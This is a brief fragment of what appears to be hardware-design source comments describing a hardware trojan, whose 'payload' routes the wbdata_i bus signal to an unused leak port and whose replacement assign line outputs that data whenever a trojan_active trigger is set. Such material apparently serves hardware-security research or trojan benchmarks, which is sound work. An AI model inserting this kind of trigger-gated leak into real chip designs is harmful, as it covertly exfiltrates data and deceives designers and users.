 ...
 * Payload: Route wbdata_i to leak port
 * 
...
// ============================================================
// Information Leak: Route wbdata_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? wbdata_i : normal_value;